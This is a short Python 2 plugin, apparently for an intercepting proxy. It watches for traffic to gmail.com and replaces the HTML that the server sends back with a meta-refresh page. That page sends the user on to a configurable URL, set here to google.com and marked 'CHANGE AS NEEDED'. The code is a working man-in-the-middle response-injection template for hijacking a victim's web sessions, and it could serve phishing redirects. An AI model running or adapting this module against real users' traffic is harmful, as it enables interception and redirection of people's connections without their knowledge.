#!/usr/bin/python
import urllib2
import re
#from BeautifulSoup import BeautifulSoup
import api.header as header

### CHANGE AS NEEDED
request_match = (("Host","gmail.com"),)
response_match = (("Content-type","TEXT/HTML"),)
redirect_url = "http://www.google.com"
redirect_code = '''
<html><head>
  <meta http-equiv="Refresh" content="0; url=''' + redirect_url + '''">
</head><body>
  <p>Please follow <a href="''' + redirect_url + '''">link</a>!</p>
</body></html>'''



### FUNCTION TO MANIPULATE CLIENT REQUEST
def doRequest(session, request_header, data):
  changed = 0
  stop = 0
  return(request_header, data, changed, stop)



### FUNCTION TO MANIPULATE SERVER RESPONSE
def doResponse(session, request_header, response_header, data):
  changed = 0
  stop = 0

  ### DETERMINE IF WE NEED TO CHANGE DATA
  if header.headertest(request_header, request_match) & header.headertest(response_header, response_match):

    ### MANIPULATE DATA
    data = redirect_code
    print("User has been redirected to " + redirect_url)

  ### RETURN DATA
  header.headerfix(response_header, "Content-Length", str(len(data)) + '\r\n')
  return(response_header, data, changed, stop)
